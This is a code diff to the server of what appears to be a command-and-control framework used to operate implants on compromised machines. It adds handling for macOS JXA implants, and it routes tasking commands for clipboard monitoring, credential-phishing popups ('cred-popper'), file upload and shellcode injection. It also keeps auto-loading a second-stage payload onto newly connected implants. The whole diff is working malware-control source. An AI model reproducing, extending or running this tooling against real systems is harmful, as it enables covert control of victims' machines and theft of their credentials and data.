@@ -24,10 +24,15 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
         encKey = implant.Key
         Domain = implant.Domain
         User = implant.User
+        implant_type = implant.Pivot
         if RandomURI in uriPath and cookieVal:
             DB.update_implant_lastseen(now.strftime("%Y-%m-%d %H:%M:%S"), RandomURI)
             decCookie = decrypt(encKey, cookieVal)
-            rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
+            if implant_type == "JXA":
+                rawoutput = decrypt(encKey, post_data[1500:])
+            else:
+                rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
+
             if decCookie.startswith("Error"):
                 print(Colours.RED)
                 print("The multicmd errored: ")
@@ -92,11 +97,11 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
                 newImplant.save()
                 newImplant.display()
                 newImplant.autoruns()
-                if "pbind-command run-exe PBind PBind start" in executedCmd: 
+                if "pbind-command run-exe PBind PBind start" in executedCmd:
                     DB.new_task("pbind-pivot-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
                 else:
                     DB.new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
-                    
+
             elif "fcomm-connect " in executedCmd and "FComm-Connected" in outputParsed:
                 outputParsed = re.search("FComm-Connected:.*", outputParsed)
                 outputParsed = outputParsed[0].replace("FComm-Connected: ", "")
@@ -255,6 +260,9 @@ def newTask(path):
                     if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode") or command.lower().startswith("run-exe pbind pbind run-exe core.program core inject-shellcode") or command.lower().startswith("pbind-command run-exe core.program core inject-shellcode") or command.lower().startswith("pbind-pivot-command run-exe core.program core inject-shellcode")):
                         user_command = "Inject Shellcode: %s" % command[command.index("#") + 1:]
                         command = command[:command.index("#")]
+                    elif (command.lower().startswith("run-jxa ")) or (command.lower().startswith("clipboard-monitor ")) or (command.lower().startswith("cred-popper ")):
+                        user_command = command[:command.index("#")]
+                        command = "run-jxa " + command[command.index("#") + 1:]
                     elif (command.lower().startswith('upload-file') or command.lower().startswith('pbind-command upload-file') or command.lower().startswith('fcomm-command upload-file')):
                         PBind = False
                         FComm = False
@@ -289,6 +297,8 @@ def newTask(path):
                             command = f"Upload-File -Destination \"{upload_file_destination}\" -Base64 {upload_file_bytes_b64} {upload_args}"
                         elif implant_type.lower().startswith('py'):
                             command = f"upload-file \"{upload_file_destination}\":{upload_file_bytes_b64} {upload_args}"
+                        elif implant_type.lower().startswith('jxa'):
+                            command = f"upload-file {upload_file_destination}:{upload_file_bytes_b64} {upload_args}"
                         else:
                             print(Colours.RED)
                             print("Error parsing upload command: %s" % upload_args)
@@ -350,7 +360,7 @@ def newTask(path):
                         except Exception as e:
                             print("Cannot base64 the command for PS")
                             print(e)
-                            traceback.print_exc()                            
+                            traceback.print_exc()
                     elif task[2].startswith("pbind-command run-exe Program PS "):
                         try:
                             cmd = (task[2]).replace("pbind-command run-exe Program PS ", "")
@@ -453,7 +463,7 @@ def newTask(path):
                         except Exception as e:
                             print("Cannot base64 the command for PS")
                             print(e)
-                            traceback.print_exc()                        
+                            traceback.print_exc()
                     elif task[2].startswith("pbind-connect"):
                         command = command.replace("pbind-connect ", "run-exe PBind PBind start ")
                     elif task[2].startswith("pbind-kill"):
@@ -499,7 +509,7 @@ def newTask(path):
                         except Exception as e:
                             print("Cannot base64 the command for PS")
                             print(e)
-                            traceback.print_exc()  
+                            traceback.print_exc()
                     elif task[2].startswith("pbind-pivot-connect"):
                         command = command.replace("pbind-pivot-connect ", "run-exe PBind PBind run-exe PBind PBind start ")
                     elif task[2].startswith("pbind-pivot-kill"):
